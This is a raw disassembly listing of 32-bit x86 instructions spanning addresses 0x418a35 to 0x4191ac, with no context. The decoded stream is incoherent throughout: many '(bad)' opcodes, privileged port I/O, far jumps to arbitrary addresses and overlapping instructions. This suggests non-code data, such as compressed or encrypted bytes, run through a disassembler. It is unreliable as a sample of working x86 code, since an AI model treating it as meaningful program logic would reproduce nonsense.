  418a35:	outs   dx,BYTE PTR ds:[esi]
  418a36:	cmp    BYTE PTR [ecx-0xa],dh
  418a39:	or     al,0xc5
  418a3b:	(bad)  
  418a3c:	sbb    DWORD PTR [ecx],esi
  418a3e:	mov    ah,0xed
  418a40:	adc    bh,BYTE PTR [ebx-0x1b]
  418a43:	and    ebp,0x6aad99e1
  418a49:	push   0x7e
  418a4b:	es ja  0x418acc
  418a4e:	ins    DWORD PTR es:[edi],dx
  418a4f:	xchg   ebp,eax
  418a50:	xchg   DWORD PTR [ecx],esi
  418a52:	xchg   ebx,eax
  418a53:	or     ebp,DWORD PTR [edx]
  418a55:	in     al,0x92
  418a57:	push   cs
  418a58:	mov    esp,ss
  418a5a:	and    bh,ch
  418a5c:	and    eax,DWORD PTR [esi+0x796da21e]
  418a62:	mov    al,ds:0xe3bf7b44
  418a67:	shr    ebx,cl
  418a69:	xor    DWORD PTR [ebp+ebx*8+0x3a],0xef524f8c
  418a71:	aaa    
  418a72:	(bad)  
  418a74:	and    bh,BYTE PTR [esi-0x14]
  418a77:	jp     0x418a2f
  418a79:	mov    ?,WORD PTR [eax+0x1b]
  418a7c:	sti    
  418a7d:	outs   dx,DWORD PTR ds:[esi]
  418a7e:	jge    0x418a30
  418a80:	push   ecx
  418a81:	mov    ebx,ss
  418a83:	pop    ebp
  418a84:	outs   dx,BYTE PTR ds:[esi]
  418a85:	inc    edi
  418a86:	repz or eax,0x5f930462
  418a8c:	nop
  418a8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a8e:	repnz iret 
  418a90:	clc    
  418a91:	cmp    edx,ecx
  418a93:	mov    al,0x29
  418a95:	jmp    0x109e6e4a
  418a9a:	(bad)  
  418a9b:	scas   al,BYTE PTR es:[edi]
  418a9c:	dec    ecx
  418a9d:	cmp    dh,al
  418a9f:	in     eax,dx
  418aa0:	(bad)  
  418aa1:	repz out dx,al
  418aa3:	call   0x7506:0x57729437
  418aaa:	repnz fisttp DWORD PTR [edx+0x0]
  418aae:	rol    DWORD PTR [edi-0x3000d52f],cl
  418ab4:	es daa 
  418ab6:	push   ss
  418ab7:	clc    
  418ab8:	in     al,0x2b
  418aba:	mov    DWORD PTR [ebx+0x68079073],0x7b401cde
  418ac4:	sbb    BYTE PTR [ecx-0x8c64d50],bh
  418aca:	arpl   WORD PTR [ebp+0x76],ax
  418acd:	sub    BYTE PTR [ebp+0x2dccc108],dl
  418ad3:	cmc    
  418ad4:	int3   
  418ad5:	or     DWORD PTR [ebx],0xfffffff5
  418ad8:	inc    ebx
  418ad9:	sub    BYTE PTR [edi],0x62
  418adc:	ins    BYTE PTR es:[edi],dx
  418add:	cmp    DWORD PTR [esi],esp
  418adf:	call   0x620ffa75
  418ae4:	das    
  418ae5:	fwait
  418ae6:	jg     0x418a8c
  418ae8:	jb     0x418a75
  418aea:	ins    BYTE PTR es:[edi],dx
  418aeb:	pushf  
  418aec:	sbb    DWORD PTR [ebp-0x33b622da],ecx
  418af2:	inc    edx
  418af3:	mov    esp,0x575cf040
  418af8:	fldenv [ebp-0x241bf46e]
  418afe:	xchg   edx,eax
  418aff:	push   ss
  418b00:	out    dx,eax
  418b01:	cli    
  418b02:	ret    0x7b9d
  418b05:	jns    0x418abb
  418b07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b08:	mov    esi,0x90afecf1
  418b0d:	outs   dx,DWORD PTR ds:[esi]
  418b0e:	stos   BYTE PTR es:[edi],al
  418b0f:	sub    DWORD PTR [esi+0x318d6496],esi
  418b15:	mov    ah,0xf
  418b17:	pusha  
  418b18:	imul   esp,DWORD PTR [edi+edx*2-0x2f],0x4dfe1719
  418b20:	pop    ss
  418b21:	sbb    al,0x59
  418b23:	fs jle 0x418ab0
  418b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b27:	jle    0x418b44
  418b29:	mov    edi,ecx
  418b2b:	(bad)  
  418b2d:	xor    DWORD PTR [ebp-0x4a1ba97d],eax
  418b33:	xchg   ebp,eax
  418b34:	cmc    
  418b35:	xor    eax,0xb96698e9
  418b3a:	adc    BYTE PTR [ecx],0xfd
  418b3d:	xchg   esp,eax
  418b3e:	daa    
  418b3f:	sub    cl,dh
  418b41:	outs   dx,DWORD PTR ds:[si]
  418b43:	mov    cl,0x65
  418b45:	lds    eax,FWORD PTR [eax]
  418b47:	int    0xdc
  418b49:	add    al,0x7c
  418b4b:	push   ebx
  418b4c:	adc    ecx,DWORD PTR [ecx]
  418b4e:	sub    al,0x55
  418b50:	test   dl,bh
  418b52:	inc    esi
  418b53:	(bad)
  418b57:	push   esp
  418b58:	xor    al,0xc4
  418b5a:	lahf   
  418b5b:	mov    al,ds:0x42917e98
  418b60:	xor    DWORD PTR [ebx],edi
  418b62:	jle    0x418b38
  418b64:	sbb    ebx,DWORD PTR [esi-0x117192bf]
  418b6a:	jae    0x418b68
  418b6c:	mov    ebx,0xa3e61824
  418b71:	ja     0x418b66
  418b73:	jne    0x418b20
  418b75:	fdivr  QWORD PTR [ebx]
  418b77:	jae    0x418b67
  418b79:	add    eax,0x58350bc4
  418b7e:	cmp    bh,0x81
  418b81:	push   0x1d
  418b83:	dec    esp
  418b84:	(bad)  
  418b85:	fldcw  WORD PTR [edx]
  418b87:	sar    DWORD PTR [edx+0x55283229],0x0
  418b8e:	xchg   esi,eax
  418b8f:	jmp    0x418bd1
  418b91:	jge    0x418b1a
  418b93:	cmp    al,0x54
  418b95:	js     0x418c08
  418b97:	dec    edi
  418b98:	mov    ah,0x8e
  418b9a:	or     dl,BYTE PTR [eax+0x7a]
  418b9d:	out    0x93,eax
  418b9f:	mov    ch,BYTE PTR [esp+ebp*8-0x10]
  418ba3:	adc    bh,BYTE PTR [ebp+0x8]
  418ba6:	scas   eax,DWORD PTR es:[edi]
  418ba7:	imul   esi,edi,0xffffffde
  418baa:	and    DWORD PTR [ecx+0x70faecb2],eax
  418bb0:	mov    ds:0xa40b28,al
  418bb5:	ror    dh,0x38
  418bb8:	push   cs
  418bb9:	stos   DWORD PTR es:[edi],eax
  418bba:	bound  eax,QWORD PTR [edi+0x718576d6]
  418bc0:	jae    0x418c05
  418bc2:	xor    bh,ah
  418bc4:	pop    edx
  418bc5:	or     al,0xe6
  418bc7:	push   esp
  418bc8:	xchg   dh,bl
  418bca:	mov    ebx,0xb4fba2ab
  418bcf:	push   es
  418bd0:	aaa    
  418bd1:	xrelease mov BYTE PTR [edi],0x21
  418bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bd6:	jge    0x418baf
  418bd8:	leave  
  418bd9:	pop    esi
  418bda:	cs push eax
  418bdc:	adc    BYTE PTR [esi],ch
  418bde:	aas    
  418bdf:	sbb    esp,eax
  418be1:	xor    eax,0x7d533036
  418be6:	inc    edx
  418be7:	mov    al,ds:0x40e6d3ac
  418bec:	popa   
  418bed:	push   ebp
  418bee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bef:	je     0x418c20
  418bf1:	mov    cl,0x3
  418bf3:	ja     0x418c17
  418bf5:	shl    DWORD PTR [esp+edi*4-0x5f],0x90
  418bfa:	add    BYTE PTR [edx-0x4f9061f],ah
  418c00:	jmp    0x5c9c:0xb59a99f4
  418c07:	clc    
  418c08:	xlat   BYTE PTR ds:[ebx]
  418c09:	repz or BYTE PTR [eax+ebx*2],al
  418c0d:	gs mov ebx,0xced44048
  418c13:	sub    al,ah
  418c15:	mov    dl,BYTE PTR [edx-0x104888c8]
  418c1b:	mov    dh,0x2c
  418c1d:	test   al,0x86
  418c1f:	stos   BYTE PTR es:[edi],al
  418c20:	lock fld st(1)
  418c23:	pop    es
  418c24:	dec    ebp
  418c25:	sub    al,0x78
  418c27:	sbb    eax,0xf54b6a2a
  418c2c:	mov    WORD PTR [edi],?
  418c2e:	mov    esi,0xac614576
  418c33:	adc    ebx,esi
  418c35:	push   esp
  418c36:	test   BYTE PTR [ecx],0x5f
  418c39:	jg     0x418c33
  418c3b:	fcom   DWORD PTR [ebp+0x14]
  418c3e:	scas   eax,DWORD PTR es:[edi]
  418c3f:	pop    ebp
  418c40:	adc    ebx,ebp
  418c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c43:	mov    ?,WORD PTR [eax-0x559578d9]
  418c49:	dec    ebx
  418c4a:	mov    ebp,0x169e0d30
  418c4f:	bound  ebp,QWORD PTR [eax+esi*4+0x1a]
  418c53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c54:	jns    0x418c4c
  418c56:	pusha  
  418c57:	dec    sp
  418c59:	cmp    eax,0xc73e7df0
  418c5e:	out    0xdb,eax
  418c60:	in     eax,0x50
  418c62:	sbb    al,0x9a
  418c64:	fidivr DWORD PTR [esi]
  418c66:	ret    0xa829
  418c69:	pop    ss
  418c6a:	xchg   ecx,eax
  418c6b:	leave  
  418c6c:	or     al,0x81
  418c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c6f:	div    DWORD PTR [edx-0x6361e108]
  418c75:	pusha  
  418c76:	ret    0x8d3f
  418c79:	cmp    eax,edx
  418c7b:	inc    ebp
  418c7c:	cmp    BYTE PTR [edx+0x50],ah
  418c7f:	jecxz  0x418c3f
  418c81:	sahf   
  418c82:	jg     0x418cf3
  418c84:	cmp    al,0xcd
  418c86:	xchg   ebx,eax
  418c87:	fstp   DWORD PTR [esi+ebp*4-0x18]
  418c8b:	hlt    
  418c8c:	and    ch,BYTE PTR [eax-0x7a]
  418c8f:	gs dec esp
  418c91:	cld    
  418c92:	(bad)  
  418c94:	jecxz  0x418c43
  418c96:	jecxz  0x418cbf
  418c98:	lods   al,BYTE PTR fs:[esi]
  418c9a:	retf   0x3eb0
  418c9d:	lahf   
  418c9e:	sub    ebx,DWORD PTR [ebx-0x2f]
  418ca1:	popf   
  418ca2:	jnp    0x418c43
  418ca4:	or     al,bh
  418ca6:	mov    eax,ds:0xa05190bc
  418cab:	(bad)  [esi-0x406929c8]
  418cb1:	mov    edx,0xa92f84fb
  418cb6:	aas    
  418cb7:	dec    esi
  418cb8:	jge    0x418cff
  418cba:	and    BYTE PTR [esi+0x4cfbe22c],0xde
  418cc1:	lods   eax,DWORD PTR ds:[esi]
  418cc2:	fsub   DWORD PTR [ecx-0x15f197c6]
  418cc8:	stos   DWORD PTR es:[edi],eax
  418cc9:	inc    ecx
  418cca:	pop    es
  418ccb:	in     al,0x9
  418ccd:	aam    0x0
  418ccf:	mov    ecx,0xad3729cb
  418cd4:	sar    ch,1
  418cd6:	push   esi
  418cd7:	adc    ebp,eax
  418cd9:	call   0x98dfd36a
  418cde:	adc    esi,DWORD PTR [esi+ebp*1]
  418ce1:	or     eax,DWORD PTR [ecx+0x13]
  418ce4:	stos   DWORD PTR es:[edi],eax
  418ce5:	cdq    
  418ce6:	cmc    
  418ce7:	jecxz  0x418c79
  418ce9:	inc    esi
  418cea:	xchg   ebp,eax
  418ceb:	sbb    BYTE PTR [edx-0x4ac8c55e],0x24
  418cf2:	pop    edi
  418cf3:	in     al,0x95
  418cf5:	nop
  418cf6:	xor    dh,BYTE PTR [ebx-0x14c813ad]
  418cfc:	fiadd  DWORD PTR [ecx+0x56ab7961]
  418d02:	in     al,0xb3
  418d04:	jo     0x418ce6
  418d06:	mov    ebx,0x5c34743e
  418d0b:	je     0x418d71
  418d0d:	jnp    0x418ca3
  418d0f:	nop
  418d10:	sbb    DWORD PTR [ebp-0x5d],ecx
  418d13:	test   DWORD PTR [eax-0x4f],0x45cee271
  418d1a:	mov    gs,WORD PTR [eax+0x3e]
  418d1d:	push   edi
  418d1e:	cmp    al,0x48
  418d20:	sub    eax,0x4bd6932e
  418d25:	in     al,dx
  418d26:	xchg   ebp,eax
  418d27:	int3   
  418d28:	daa    
  418d29:	ret    
  418d2a:	mov    esi,0x5c6e3d6a
  418d2f:	hlt    
  418d30:	imul   esi,DWORD PTR [esi+0x2b142db7],0x11
  418d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d38:	scas   eax,DWORD PTR es:[edi]
  418d39:	pop    es
  418d3a:	xor    DWORD PTR [esi+0x58055bae],edx
  418d40:	int3   
  418d41:	outs   dx,DWORD PTR ds:[esi]
  418d42:	inc    edx
  418d43:	sub    ebp,DWORD PTR [esi-0x7ddc7d7b]
  418d49:	xor    DWORD PTR [esi+0x3b],0xe2cc5162
  418d50:	push   es
  418d51:	or     DWORD PTR [ebp-0x60],ebp
  418d54:	js     0x418dcd
  418d56:	fdivr  st,st(6)
  418d58:	adc    BYTE PTR [ecx],cl
  418d5a:	mov    eax,ds:0xd43e16ec
  418d5f:	nop
  418d60:	cli    
  418d61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d62:	inc    ebp
  418d63:	cli    
  418d64:	xor    al,dh
  418d66:	jnp    0x418d7c
  418d68:	jg     0x418d03
  418d6a:	int3   
  418d6b:	sbb    al,0x31
  418d6d:	mov    ah,0xa5
  418d6f:	fs pusha 
  418d71:	xor    al,0xe9
  418d73:	add    ebx,ebp
  418d75:	add    al,0x82
  418d77:	popa   
  418d78:	cdq    
  418d79:	das    
  418d7a:	ins    DWORD PTR es:[edi],dx
  418d7b:	mov    ch,0x7f
  418d7d:	mov    al,0xcd
  418d7f:	(bad)  
  418d81:	sub    esp,DWORD PTR [eax+0x376fc2b9]
  418d87:	dec    ebx
  418d88:	dec    ebp
  418d89:	jg     0x418df8
  418d8b:	repz push ecx
  418d8d:	(bad)  
  418d8e:	cs mov edx,eax
  418d91:	xchg   DWORD PTR [edi-0x1c],esp
  418d94:	mov    ebx,0x78f483a5
  418d99:	mov    ds:0xefc76018,al
  418d9e:	or     BYTE PTR [ecx-0x17],dl
  418da1:	aad    0xd
  418da3:	jnp    0x418d55
  418da5:	aad    0x2c
  418da7:	mov    bl,0x9d
  418da9:	mov    edx,0xd3079e41
  418dae:	sbb    WORD PTR [ebp-0x55f36a78],di
  418db5:	dec    edi
  418db6:	(bad)  
  418db7:	cwde   
  418db8:	push   0xffffff81
  418dba:	jnp    0x418e28
  418dbc:	sub    esp,esp
  418dbe:	sti    
  418dbf:	or     eax,0x98120f3
  418dc4:	jecxz  0x418dac
  418dc6:	in     eax,dx
  418dc7:	jmp    0x5e74f3b2
  418dcc:	and    ebp,0x13
  418dcf:	std    
  418dd0:	cli    
  418dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dd2:	enter  0xf39b,0xa6
  418dd6:	push   eax
  418dd7:	(bad)
  418dda:	loop   0x418e58
  418ddc:	or     ah,BYTE PTR [edx+eax*1-0x3d]
  418de0:	inc    edi
  418de1:	jecxz  0x418db4
  418de3:	xchg   esi,eax
  418de4:	mov    ebp,DWORD PTR [ecx-0x2011d952]
  418dea:	test   DWORD PTR [edx-0x32],ebx
  418ded:	popa   
  418dee:	lods   eax,DWORD PTR ds:[esi]
  418def:	call   0xb846dc10
  418df4:	xchg   edi,eax
  418df5:	pop    ebx
  418df6:	xchg   ecx,eax
  418df7:	(bad)  
  418df8:	in     al,0xfe
  418dfa:	cdq    
  418dfb:	mov    ecx,0x45d8f771
  418e00:	mov    eax,0x46e4f03b
  418e05:	sbb    al,0xd9
  418e07:	mov    dl,0xfe
  418e09:	or     eax,0x1bbfdb49
  418e0e:	mov    DWORD PTR [ebp-0x38df157c],ecx
  418e14:	js     0x418dda
  418e16:	xchg   esp,eax
  418e17:	retf   0xabb7
  418e1a:	xchg   ecx,eax
  418e1b:	retf   0xd6e2
  418e1e:	sub    dl,bh
  418e20:	sub    al,0x16
  418e22:	in     eax,0x48
  418e24:	xchg   edx,eax
  418e25:	mov    eax,0x72fec372
  418e2a:	pushf  
  418e2b:	jbe    0x418e0e
  418e2d:	std    
  418e2e:	(bad)  
  418e2f:	repz sti 
  418e31:	ds pop edi
  418e33:	pop    eax
  418e34:	mov    ebp,0x94a81600
  418e39:	bound  esi,QWORD PTR [eax-0x25]
  418e3c:	or     DWORD PTR [esi+0x1a],esi
  418e3f:	pop    ebx
  418e40:	or     DWORD PTR [esi],esi
  418e42:	jb     0x418e69
  418e44:	and    ah,cl
  418e46:	jno    0x418e5a
  418e48:	retf   0xdd97
  418e4b:	cmp    eax,0x6a24044e
  418e50:	mov    ds:0x37e763b1,al
  418e55:	cdq    
  418e56:	iret   
  418e57:	xchg   DWORD PTR [eax+0x2aebcbea],ebx
  418e5d:	into   
  418e5e:	mov    bl,0x2e
  418e60:	cmp    al,0x56
  418e62:	mov    edi,0x528e7874
  418e67:	mov    esp,ebx
  418e69:	push   ecx
  418e6a:	popf   
  418e6b:	cmp    BYTE PTR [ebp-0x1c14f7f5],bh
  418e71:	jp     0x418e74
  418e73:	hlt    
  418e74:	inc    esp
  418e75:	cld    
  418e76:	add    dl,BYTE PTR ds:0xc83efaae
  418e7c:	and    cl,BYTE PTR [esi]
  418e7e:	and    eax,0x612d0d7f
  418e83:	stc    
  418e84:	mov    DWORD PTR [edx+0x3a],edi
  418e87:	daa    
  418e88:	(bad)  
  418e89:	retf   
  418e8a:	(bad)  
  418e8b:	(bad)  
  418e8d:	cmp    ebp,DWORD PTR [esi+0x0]
  418e90:	das    
  418e91:	push   ss
  418e92:	mov    ebp,0xa6c369ca
  418e97:	nop
  418e98:	cdq    
  418e99:	leave  
  418e9a:	mov    bl,0x7
  418e9c:	ins    BYTE PTR es:[edi],dx
  418e9d:	jbe    0x418e5b
  418e9f:	ins    DWORD PTR es:[edi],dx
  418ea0:	jb     0x418eab
  418ea2:	imul   ecx,esp,0xac1e9c8f
  418ea8:	mov    ds:0x1dd7390,eax
  418ead:	ins    DWORD PTR es:[edi],dx
  418eae:	inc    eax
  418eaf:	and    eax,0x2b67b561
  418eb4:	or     BYTE PTR [edx],0x60
  418eb7:	lahf   
  418eb8:	add    eax,0x481a17b
  418ebd:	mov    ds:0xfe12a27b,al
  418ec2:	mov    ebx,0xea1a063b
  418ec7:	cmp    edx,DWORD PTR [ebp-0x73]
  418eca:	mov    ah,0xbd
  418ecc:	dec    ebp
  418ecd:	ror    DWORD PTR [edi],0x8b
  418ed0:	xor    eax,0x9b9b0fe7
  418ed5:	jns    0x418f21
  418ed7:	outs   dx,DWORD PTR ds:[esi]
  418ed8:	jmp    0x418f3a
  418eda:	xchg   esi,eax
  418edb:	test   al,0xb0
  418edd:	retf   
  418ede:	xchg   edi,eax
  418edf:	push   ebp
  418ee0:	xchg   ebx,eax
  418ee1:	mov    dh,0xc5
  418ee3:	sub    BYTE PTR [ebp-0x1572d37],ah
  418ee9:	ror    al,cl
  418eeb:	ins    DWORD PTR es:[edi],dx
  418eec:	mov    edi,0xe1742aa4
  418ef1:	fstp   st(4)
  418ef3:	mov    esi,0x220b96e9
  418ef8:	mov    dh,0x2c
  418efa:	xchg   ebx,eax
  418efb:	sub    DWORD PTR [ebp+0x31],ebx
  418efe:	in     eax,0x1b
  418f00:	ror    DWORD PTR [eax-0x4b],1
  418f03:	sub    BYTE PTR [ebx],0x6a
  418f06:	pop    esp
  418f07:	mov    edi,0x460b945
  418f0c:	pop    ebp
  418f0d:	rcr    BYTE PTR [edx+0x13],cl
  418f10:	lea    esi,[esi]
  418f12:	call   DWORD PTR [eax+0x76]
  418f15:	ficom  WORD PTR ds:0x488d6f4
  418f1b:	lea    esi,[eax-0x48]
  418f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f1f:	addr16 mov ebp,0x62d14797
  418f25:	outs   dx,DWORD PTR ds:[esi]
  418f26:	dec    edx
  418f27:	and    eax,0x13a7a32
  418f2c:	iret   
  418f2d:	je     0x418ed2
  418f2f:	add    cl,BYTE PTR [edx-0x18]
  418f32:	leave  
  418f33:	test   al,0x84
  418f35:	adc    esp,DWORD PTR [edi+edi*2-0xd]
  418f39:	inc    esp
  418f3a:	sub    eax,DWORD PTR [esp+eiz*4]
  418f3d:	cli    
  418f3e:	jns    0x418fa8
  418f40:	in     al,dx
  418f41:	out    dx,eax
  418f42:	push   es
  418f43:	dec    esi
  418f44:	add    BYTE PTR [edx-0x3f],0x95
  418f48:	addr16 mov esi,0x5e9bee98
  418f4e:	mov    bh,0x21
  418f50:	adc    eax,0x75a4be47
  418f55:	popa   
  418f56:	pop    ebp
  418f57:	test   DWORD PTR [ebx+0x40],esi
  418f5a:	mov    ch,0xef
  418f5c:	inc    eax
  418f5d:	xchg   ebx,eax
  418f5e:	pop    eax
  418f5f:	sub    bh,bl
  418f61:	push   cs
  418f62:	sub    eax,0x3a50ca37
  418f67:	fs sub esp,esi
  418f6a:	test   eax,0x1c0bc741
  418f6f:	inc    esi
  418f70:	jl     0x418fbe
  418f72:	mov    bh,0x87
  418f74:	pop    ss
  418f75:	outs   dx,DWORD PTR ds:[esi]
  418f76:	inc    ecx
  418f77:	inc    ecx
  418f78:	rcl    edx,1
  418f7a:	sahf   
  418f7b:	cli    
  418f7c:	call   0x6742c54a
  418f81:	sub    edx,DWORD PTR [eax]
  418f83:	adc    bh,BYTE PTR [esp+ecx*1+0x6c]
  418f87:	(bad)  
  418f88:	in     eax,0x21
  418f8a:	rcl    BYTE PTR [ebp-0x18],1
  418f8d:	jnp    0x418fe6
  418f8f:	call   0xffef9a6d
  418f94:	xor    eax,0x5c407c8
  418f99:	xchg   ebp,eax
  418f9a:	push   ebx
  418f9b:	repnz sbb ch,BYTE PTR ds:[esi+0x267dadb4]
  418fa3:	inc    ecx
  418fa4:	add    DWORD PTR [eax],0xffffffe0
  418fa7:	or     DWORD PTR [esi],edi
  418fa9:	push   edx
  418faa:	mov    esp,0x14742ebf
  418faf:	inc    esp
  418fb0:	pop    ds
  418fb1:	cwde   
  418fb2:	or     DWORD PTR [edx+eax*8+0x1ab8004e],esi
  418fb9:	in     eax,0x4b
  418fbb:	(bad)  
  418fbc:	in     al,0x7
  418fbe:	call   0x458e:0x14a2e867
  418fc5:	sahf   
  418fc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fc7:	xor    BYTE PTR [ecx+0x777be5f0],ah
  418fcd:	cs xchg esi,eax
  418fcf:	jmp    0x2f09:0x461ba39a
  418fd6:	fmulp  st(1),st
  418fd8:	mov    dl,BYTE PTR [ebp-0x3ed05816]
  418fde:	mov    edx,0xf1a4c7f8
  418fe3:	cli    
  418fe4:	adc    al,0x3b
  418fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fe7:	iret   
  418fe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fe9:	pop    ebp
  418fea:	aas    
  418feb:	dec    esp
  418fec:	in     al,0x67
  418fee:	stos   DWORD PTR es:[edi],eax
  418fef:	pop    eax
  418ff0:	xor    eax,0xb384ec76
  418ff5:	pop    es
  418ff6:	ret    0x2a6a
  418ff9:	fst    DWORD PTR es:[ebx+0xf]
  418ffd:	inc    esp
  418ffe:	imul   eax,DWORD PTR [esi+0x3f],0xf233e6a2
  419005:	sbb    DWORD PTR [edx+0x5c],edx
  419008:	retf   0x9cef
  41900b:	and    BYTE PTR [edi],dl
  41900d:	jmp    0x545a3227
  419012:	stos   BYTE PTR es:[edi],al
  419013:	fiadd  WORD PTR [esi-0x37]
  419016:	push   edx
  419017:	push   ss
  419018:	loope  0x418fce
  41901a:	pop    ebp
  41901b:	xchg   DWORD PTR [edi-0x59],ecx
  41901e:	fdivr  DWORD PTR [eax+0x416ea5f]
  419024:	pop    ds
  419025:	fisub  WORD PTR [eax+0x71]
  419028:	jmp    DWORD PTR [esi-0x72f9b68e]
  41902e:	bound  esp,QWORD PTR [ecx+ecx*8]
  419031:	sub    eax,DWORD PTR [eax+edx*2+0x41]
  419035:	pop    ds
  419036:	sbb    al,0x99
  419038:	imul   ebx,DWORD PTR [ecx+ecx*2-0x27fd71c7],0xffffff92
  419040:	outs   dx,BYTE PTR ds:[esi]
  419041:	or     esi,ebp
  419043:	iret   
  419044:	mov    ch,0xa3
  419046:	es (bad) 
  419048:	stc    
  419049:	pop    ebp
  41904a:	or     al,0xa4
  41904c:	sbb    al,0xe4
  41904e:	xchg   ecx,eax
  41904f:	out    dx,eax
  419050:	xchg   ebx,eax
  419051:	or     al,0x11
  419053:	popf   
  419054:	xchg   ebx,eax
  419055:	adc    al,0x4c
  419057:	fcomip st,st(2)
  419059:	fcmovb st,st(0)
  41905b:	sub    cl,BYTE PTR [ebx-0x3ebc5d73]
  419061:	fs pop ebp
  419063:	jg     0x419064
  419065:	jbe    0x418ff3
  419067:	push   edx
  419068:	push   0x69
  41906a:	clc    
  41906b:	sub    eax,0x9b2c3809
  419070:	das    
  419071:	and    DWORD PTR [ecx+0x20],esi
  419074:	sbb    esp,DWORD PTR [ecx-0x7c]
  419077:	mov    al,ss:0xe8692102
  41907d:	(bad)  
  41907e:	cli    
  41907f:	jl     0x41909b
  419081:	cmp    eax,0x888cad6f
  419086:	jbe    0x419107
  419088:	fsubrp st(5),st
  41908a:	test   al,0xa5
  41908c:	fld    TBYTE PTR [ebp+edi*1-0x34]
  419090:	lds    esi,FWORD PTR ds:0xe1a4ff69
  419096:	stos   BYTE PTR es:[edi],al
  419097:	dec    edi
  419098:	dec    esp
  419099:	test   al,0x81
  41909b:	xchg   DWORD PTR [edx],edi
  41909d:	and    ebx,esi
  41909f:	sub    cl,BYTE PTR [edx]
  4190a1:	cwde   
  4190a2:	inc    edx
  4190a3:	and    DWORD PTR [esi+0x54f8c771],0xfffffff6
  4190aa:	pslld  mm3,mm4
  4190ad:	fiadd  DWORD PTR [ecx]
  4190af:	ins    DWORD PTR es:[edi],dx
  4190b0:	lods   eax,DWORD PTR ds:[esi]
  4190b1:	xchg   esp,eax
  4190b2:	popf   
  4190b3:	sbb    DWORD PTR [ebp+edi*8-0x46],edx
  4190b7:	mov    ah,0x26
  4190b9:	cli    
  4190ba:	jnp    0x41903f
  4190bc:	rcr    BYTE PTR [ebx+0x37428d62],cl
  4190c2:	lock and eax,0xeefdace2
  4190c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190c9:	mov    ebx,es
  4190cb:	jle    0x419086
  4190cd:	mov    ebx,0x24ea588c
  4190d2:	xchg   edx,eax
  4190d3:	mov    esi,?
  4190d5:	sahf   
  4190d6:	xor    eax,0x1d0ab6c4
  4190db:	loopne 0x4190b5
  4190dd:	mov    cl,0xff
  4190df:	sahf   
  4190e0:	push   esi
  4190e1:	jbe    0x41909e
  4190e3:	fldcw  WORD PTR [eax]
  4190e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190e6:	fisttp WORD PTR [edi+0x137ade1a]
  4190ec:	ins    DWORD PTR es:[edi],dx
  4190ed:	cwde   
  4190ee:	sub    DWORD PTR [edx],edi
  4190f0:	les    edx,FWORD PTR [ecx-0x62d100e0]
  4190f6:	popa   
  4190f7:	or     al,0x6b
  4190f9:	inc    eax
  4190fa:	aam    0x6a
  4190fc:	adc    BYTE PTR ds:0xcfb2b8d3,ah
  419102:	fucomip st,st(7)
  419104:	cmp    ax,0xa391
  419108:	or     ecx,ecx
  41910a:	jne    0x41914e
  41910c:	adc    al,0xfd
  41910e:	shr    DWORD PTR [ecx+ecx*2],cl
  419111:	test   BYTE PTR [esi],ah
  419113:	out    dx,al
  419114:	pop    ebx
  419115:	out    0x82,eax
  419117:	dec    edx
  419118:	sbb    al,0xc6
  41911a:	xchg   esp,eax
  41911b:	pop    ecx
  41911c:	lahf   
  41911d:	xchg   ecx,eax
  41911e:	inc    ebp
  41911f:	out    0xd2,eax
  419121:	xor    al,0x9b
  419123:	jnp    0x4190c4
  419125:	sbb    esi,ebx
  419127:	pop    esi
  419128:	or     DWORD PTR [edi-0x45018c0b],ebp
  41912e:	nop
  41912f:	pop    ss
  419130:	pushf  
  419131:	mov    esp,0xff5f34ac
  419136:	push   ds
  419137:	push   es
  419138:	mov    ecx,0x94213c8f
  41913d:	stos   DWORD PTR es:[edi],eax
  41913e:	ja     0x4190d1
  419140:	pop    edx
  419141:	adc    al,0x82
  419143:	and    al,0xb3
  419145:	jp     0x4190cb
  419147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419148:	sbb    BYTE PTR [eax+0x32c13854],dh
  41914e:	dec    ebx
  41914f:	cli    
  419150:	jmp    0x4190fe
  419152:	lahf   
  419153:	fiadd  DWORD PTR [esi]
  419155:	fisttp QWORD PTR [ebx]
  419157:	xchg   dh,al
  419159:	xor    DWORD PTR [edx],ebx
  41915b:	test   eax,0xdf261e5d
  419160:	(bad)  
  419161:	hlt    
  419162:	cli    
  419163:	imul   ebp,DWORD PTR [eax-0x3c],0x3c
  419167:	shl    eax,1
  419169:	xchg   edi,eax
  41916a:	rcl    DWORD PTR [edx+0x70],1
  41916d:	and    esi,DWORD PTR [esi+0x4f525464]
  419173:	dec    edx
  419174:	jnp    0x419102
  419176:	sub    eax,0xd4b42e6e
  41917b:	cmp    al,0x4c
  41917d:	(bad)  
  41917e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41917f:	cdq    
  419180:	inc    esi
  419181:	dec    esi
  419182:	stos   DWORD PTR es:[edi],eax
  419183:	lock cmp ecx,ecx
  419186:	fsub   QWORD PTR ds:0xe6549cfd
  41918c:	sub    eax,0x84b7a07c
  419191:	jno    0x4191e4
  419193:	sbb    ecx,esi
  419195:	iret   
  419196:	fcom   QWORD PTR [ebx-0x76]
  419199:	adc    ecx,0x10
  41919c:	pop    ebx
  41919d:	in     eax,dx
  41919e:	bound  ebp,QWORD PTR [eax]
  4191a0:	adc    eax,0xff7489c1
  4191a5:	aas    
  4191a6:	ss nop
  4191a8:	inc    esp
  4191a9:	fstp   QWORD PTR [edx+0x2f]
  4191ac:	mov    esi,0x3bd9de48
